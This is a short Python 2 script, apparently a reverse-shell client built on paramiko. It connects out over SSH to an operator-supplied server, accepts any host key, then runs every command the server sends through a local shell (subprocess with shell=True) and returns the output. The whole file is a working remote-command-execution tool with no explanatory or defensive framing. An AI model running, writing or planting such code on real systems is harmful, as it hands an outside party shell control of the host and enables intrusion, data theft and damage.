#!/usr/bin/env python

import sys
import threading
import paramiko
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024)
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))
        client.close()
    return

server = sys.argv[1]
ssh_port = int(sys.argv[2])
username = raw_input('Username: ').strip('\n')
password = raw_input('Password: ').strip('\n')
ssh_command(server, ssh_port, username, password, 'ClientConnected')
